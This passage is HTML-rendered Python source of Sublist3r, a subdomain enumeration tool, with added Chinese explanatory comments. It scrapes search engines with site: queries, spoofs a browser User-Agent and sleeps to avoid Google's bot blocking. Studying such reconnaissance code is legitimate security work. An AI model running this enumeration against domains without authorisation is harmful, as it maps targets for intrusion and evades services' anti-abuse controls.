class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># external modules</span></span><br><span class="line"><span class="keyword">from</span> subbrute <span class="keyword">import</span> subbrute</span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2.x and 3.x compatiablity</span></span><br><span class="line"><span class="keyword">if</span> sys.version &gt; <span class="string">'3'</span>:</span><br><span class="line">    <span class="keyword">import</span> urllib.parse <span class="keyword">as</span> urlparse</span><br><span class="line">    <span class="keyword">import</span> urllib.parse <span class="keyword">as</span> urllib</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">import</span> urlparse</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># In case you cannot install some of the required development packages</span></span><br><span class="line"><span class="comment"># there's also an option to disable the SSL warning:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if we are running this on windows platform</span></span><br><span class="line">is_windows = sys.platform.startswith(<span class="string">'win'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Console Colors</span></span><br><span class="line"><span class="keyword">if</span> is_windows:</span><br><span class="line">    <span class="comment"># Windows deserves coloring too :D</span></span><br><span class="line">    G = <span class="string">'\033[92m'</span>  <span class="comment"># green</span></span><br><span class="line">    Y = <span class="string">'\033[93m'</span>  <span class="comment"># yellow</span></span><br><span class="line">    B = <span class="string">'\033[94m'</span>  <span class="comment"># blue</span></span><br><span class="line">    R = <span class="string">'\033[91m'</span>  <span class="comment"># red</span></span><br><span class="line">    W = <span class="string">'\033[0m'</span>   <span class="comment"># white</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> win_unicode_console , colorama</span><br><span class="line">        win_unicode_console.enable()</span><br><span class="line">        colorama.init()</span><br><span class="line">        <span class="comment">#Now the unicode will work ^_^</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[!] Error: Coloring libraries not installed, no coloring will be used [Check the readme]"</span>)</span><br><span class="line">        G = Y = B = R = W = G = Y = B = R = W = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    G = <span class="string">'\033[92m'</span>  <span class="comment"># green</span></span><br><span class="line">    Y = <span class="string">'\033[93m'</span>  <span class="comment"># yellow</span></span><br><span class="line">    B = <span class="string">'\033[94m'</span>  <span class="comment"># blue</span></span><br><span class="line">    R = <span class="string">'\033[91m'</span>  <span class="comment"># red</span></span><br><span class="line">    W = <span class="string">'\033[0m'</span>   <span class="comment"># white</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"""%s</span></span><br><span class="line"><span class="string">                 ____        _     _ _     _   _____</span></span><br><span class="line"><span class="string">                / ___| _   _| |__ | (_)___| |_|___ / _ __</span></span><br><span class="line"><span class="string">                \___ \| | | | '_ \| | / __| __| |_ \| '__|</span></span><br><span class="line"><span class="string">                 ___) | |_| | |_) | | \__ \ |_ ___) | |</span></span><br><span class="line"><span class="string">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|%s%s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                # Coded By Ahmed Aboul-Ela - @aboul3la</span></span><br><span class="line"><span class="string">    """</span> % (R, W, Y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parser_error</span><span class="params">(errmsg)</span>:</span></span><br><span class="line">    banner()</span><br><span class="line">    print(<span class="string">"Usage: python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" [Options] use -h for help"</span>)</span><br><span class="line">    print(R + <span class="string">"Error: "</span> + errmsg + W)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># parse the arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(epilog=<span class="string">'\tExample: \r\npython '</span> + sys.argv[<span class="number">0</span>] + <span class="string">" -d google.com"</span>)</span><br><span class="line">    parser.error = parser_error</span><br><span class="line">    parser._optionals.title = <span class="string">"OPTIONS"</span></span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--domain'</span>, help=<span class="string">"Domain name to enumerate it's subdomains"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-b'</span>, <span class="string">'--bruteforce'</span>, help=<span class="string">'Enable the subbrute bruteforce module'</span>, nargs=<span class="string">'?'</span>, default=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--ports'</span>, help=<span class="string">'Scan the found subdomains against specified tcp ports'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-v'</span>, <span class="string">'--verbose'</span>, help=<span class="string">'Enable Verbosity and display results in realtime'</span>, nargs=<span class="string">'?'</span>, default=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-t'</span>, <span class="string">'--threads'</span>, help=<span class="string">'Number of threads to use for subbrute bruteforce'</span>, type=int, default=<span class="number">30</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-e'</span>, <span class="string">'--engines'</span>, help=<span class="string">'Specify a comma-separated list of search engines'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--output'</span>, help=<span class="string">'Save the results to text file'</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_file</span><span class="params">(filename, subdomains)</span>:</span></span><br><span class="line">    <span class="comment"># saving subdomains results to output file</span></span><br><span class="line">    print(<span class="string">"%s[-] Saving results to file: %s%s%s%s"</span> % (Y, W, R, filename, W))</span><br><span class="line">    <span class="keyword">with</span> open(str(filename), <span class="string">'wt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            f.write(subdomain + os.linesep)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subdomain_sorting_key</span><span class="params">(hostname)</span>:</span></span><br><span class="line">    <span class="comment"># (把hostname拆分开后从右到左搞成list返回，如果最左边是www则返回1)</span></span><br><span class="line">    <span class="string">"""Sorting key for subdomains</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This sorting key orders subdomains from the top-level domain at the right</span></span><br><span class="line"><span class="string">    reading left, then moving '^' and 'www' to the top of their group. For</span></span><br><span class="line"><span class="string">    example, the following list is sorted correctly:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [</span></span><br><span class="line"><span class="string">        'example.com',</span></span><br><span class="line"><span class="string">        'www.example.com',</span></span><br><span class="line"><span class="string">        'a.example.com',</span></span><br><span class="line"><span class="string">        'www.a.example.com',</span></span><br><span class="line"><span class="string">        'b.a.example.com',</span></span><br><span class="line"><span class="string">        'b.example.com',</span></span><br><span class="line"><span class="string">        'example.net',</span></span><br><span class="line"><span class="string">        'www.example.net',</span></span><br><span class="line"><span class="string">        'a.example.net',</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parts = hostname.split(<span class="string">'.'</span>)[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> parts[<span class="number">-1</span>] == <span class="string">'www'</span>:</span><br><span class="line">        <span class="keyword">return</span> parts[:<span class="number">-1</span>], <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> parts, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">enumratorBase</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, base_url, engine_name, domain, subdomains=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        self.domain = urlparse.urlparse(domain).netloc</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.subdomains = []</span><br><span class="line">        self.timeout = <span class="number">25</span></span><br><span class="line">        self.base_url = base_url</span><br><span class="line">        self.engine_name = engine_name</span><br><span class="line">        self.silent = silent</span><br><span class="line">        self.verbose = verbose</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">              <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'</span>,</span><br><span class="line">              <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">              <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.8'</span>,</span><br><span class="line">              <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip'</span>,</span><br><span class="line">          &#125;</span><br><span class="line">        self.print_banner()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print_方法，重写print，加上了silent判断</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_</span><span class="params">(self, text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.silent:</span><br><span class="line">            print(text)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_banner</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" subclass can override this if they want a fancy banner :)"""</span></span><br><span class="line">        self.print_(G + <span class="string">"[-] Searching now in %s.."</span> % (self.engine_name) + W)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求，并返回</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_req</span><span class="params">(self, query, page_no=<span class="number">1</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        url = self.base_url.format(query=query, page_no=page_no)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析回应</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_response</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> response.text <span class="keyword">if</span> hasattr(response, <span class="string">"text"</span>) <span class="keyword">else</span> response.content</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_max_subdomains</span><span class="params">(self, count)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.MAX_DOMAINS == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> count &gt;= self.MAX_DOMAINS</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_max_pages</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.MAX_PAGES == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> num &gt;= self.MAX_PAGES</span><br><span class="line"></span><br><span class="line">    <span class="comment"># override</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="string">""" chlid class should override this function """</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># override</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_response_errors</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="string">""" chlid class should override this function</span></span><br><span class="line"><span class="string">        The function should return True if there are no errors and False otherwise</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_sleep</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Some enumrators require sleeping to avoid bot detections like Google enumerator"""</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" chlid class should override this function """</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">""" chlid class that user different pagnation counter should override this function """</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这个是重点, 所有引擎都用到</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enumerate</span><span class="params">(self, altquery=False)</span>:</span></span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        page_no = <span class="number">0</span></span><br><span class="line">        prev_links = []</span><br><span class="line">        retries = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> flag:</span><br><span class="line">            <span class="comment"># 返回查询语句,每次循环都多一个 -xxx.com把上一次查到的过滤掉</span></span><br><span class="line">            query = self.generate_query()</span><br><span class="line">            <span class="comment"># 数一下，已经有几个子域名了</span></span><br><span class="line">            count = query.count(self.domain)  <span class="comment"># finding the number of subdomains found so far</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># if they we reached the maximum number of subdomains in search query</span></span><br><span class="line">            <span class="comment"># then we should go over the pages</span></span><br><span class="line">            <span class="comment"># 如果到达最大值，就看下一页</span></span><br><span class="line">            <span class="keyword">if</span> self.check_max_subdomains(count):</span><br><span class="line">                page_no = self.get_page(page_no)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果到达最大值，就返回</span></span><br><span class="line">            <span class="keyword">if</span> self.check_max_pages(page_no):  <span class="comment"># maximum pages for Google to avoid getting blocked</span></span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">            resp = self.send_req(query, page_no)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># check if there is any error occured</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_response_errors(resp):</span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">            links = self.extract_domains(resp)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if the previous page hyperlinks was the similar to the current one, then maybe we have reached the last page</span></span><br><span class="line">            <span class="comment"># 如果返回的链接相似，就下一页</span></span><br><span class="line">            <span class="keyword">if</span> links == prev_links:</span><br><span class="line">                retries += <span class="number">1</span></span><br><span class="line">                page_no = self.get_page(page_no)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make another retry maybe it isn't the last page</span></span><br><span class="line">                <span class="keyword">if</span> retries &gt;= <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">            prev_links = links</span><br><span class="line">            self.should_sleep()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">enumratorBaseThreaded</span><span class="params">(multiprocessing.Process, enumratorBase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, base_url, engine_name, domain, subdomains=None, q=None, lock=threading.Lock<span class="params">()</span>, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        enumratorBase.__init__(self, base_url, engine_name, domain, subdomains, silent=silent, verbose=verbose)</span><br><span class="line">        multiprocessing.Process.__init__(self)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 锁</span></span><br><span class="line">        self.lock = lock</span><br><span class="line">        <span class="comment"># subdomains_queue 子域名队列</span></span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        domain_list = self.enumerate()</span><br><span class="line">        <span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</span><br><span class="line">            self.q.append(domain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoogleEnum</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">"https://google.com/search?q=&#123;query&#125;&amp;btnG=Search&amp;hl=en-US&amp;biw=&amp;bih=&amp;gbv=1&amp;start=&#123;page_no&#125;&amp;filter=0"</span></span><br><span class="line">        self.engine_name = <span class="string">"Google"</span></span><br><span class="line">        <span class="comment"># 一页的最大域名(10) + 本身(1) ==11</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">11</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">200</span></span><br><span class="line">        super(GoogleEnum, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        links_list = list()</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;cite.*?&gt;(.*?)&lt;\/cite&gt;'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">'&lt;span.*&gt;'</span>, <span class="string">''</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">'http'</span>):</span><br><span class="line">                    link = <span class="string">"http://"</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="comment"># 一连串判断，表示这是新的子域名</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    <span class="comment"># </span></span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_response_errors</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (type(resp) <span class="keyword">is</span> str <span class="keyword">or</span> type(resp) <span class="keyword">is</span> unicode) <span class="keyword">and</span> <span class="string">'Our systems have detected unusual traffic'</span> <span class="keyword">in</span> resp:</span><br><span class="line">            self.print_(R + <span class="string">"[!] Error: Google probably now is blocking our requests"</span> + W)</span><br><span class="line">            self.print_(R + <span class="string">"[~] Finished now the Google Enumeration ..."</span> + W)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_sleep</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">'site:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;'</span></span><br><span class="line">            <span class="comment"># 这里为啥self.MAX_DOMAINS - 2 是因为'site:&#123;domain&#125; -www.&#123;domain&#125; 已经有2个domain了 </span></span><br><span class="line">            found = <span class="string">' -'</span>.join(self.subdomains[:self.MAX_DOMAINS - <span class="number">2</span>])</span><br><span class="line">            query = fmt.format(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">"site:&#123;domain&#125; -www.&#123;domain&#125;"</span>.format(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YahooEnum</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">"https://search.yahoo.com/search?p=&#123;query&#125;&amp;b=&#123;page_no&#125;"</span></span><br><span class="line">        self.engine_name = <span class="string">"Yahoo"</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">10</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        super(YahooEnum, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        link_regx2 = re.compile(<span class="string">'&lt;span class=" fz-.*? fw-m fc-12th wr-bw.*?"&gt;(.*?)&lt;/span&gt;'</span>)</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;span class="txt"&gt;&lt;span class=" cite fw-xl fz-15px"&gt;(.*?)&lt;/span&gt;'</span>)</span><br><span class="line">        <span class="comment"># 大佬写的正则</span></span><br><span class="line">        links_list = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            links2 = link_regx2.findall(resp)</span><br><span class="line">            links_list = links + links2</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">"&lt;(\/)?b&gt;"</span>, <span class="string">""</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">'http'</span>):</span><br><span class="line">                    link = <span class="string">"http://"</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="comment"># 判断host是不是我们想要的</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里不sleep了 难道yahoo没有屏蔽机制？</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_sleep</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">'site:&#123;domain&#125; -domain:www.&#123;domain&#125; -domain:&#123;found&#125;'</span></span><br><span class="line">            <span class="comment"># 这里最大域名数量是77，难度yahoo可以写这么多?⬇️</span></span><br><span class="line">            found = <span class="string">' -domain:'</span>.join(self.subdomains[:<span class="number">77</span>])</span><br><span class="line">            query = fmt.format(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">"site:&#123;domain&#125;"</span>.format(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AskEnum</span><span class="params">(enumratorBaseThreaded)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, subdomains=None, q=None, silent=False, verbose=True)</span>:</span></span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">'http://www.ask.com/web?q=&#123;query&#125;&amp;page=&#123;page_no&#125;&amp;qid=8D6EE6BF52E0C04527E51F64F22C4534&amp;o=0&amp;l=dir&amp;qsrc=998&amp;qo=pagination'</span></span><br><span class="line">        self.engine_name = <span class="string">"Ask"</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">11</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        links_list = list()</span><br><span class="line">        link_regx = re.compile(<span class="string">'&lt;p class="web-result-url"&gt;(.*?)&lt;/p&gt;'</span>)</span><br><span class="line">        <span class="comment"># 这一段有很大相似哦</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">'http'</span>):</span><br><span class="line">                    link = <span class="string">"http://"</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="comment"># 计算方式不一样</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_query</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">'site:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;'</span></span><br><span class="line">            found = <span class="string">' -'</span>.join(self.subdomains[:self.MAX_DOMAINS])</span><br><span class="line">            query = fmt.format(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">"site:&#123;domain&#125; -www.&#123;domain&#125;"</span>.format(domain=self.domain)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BingEnum</span><span 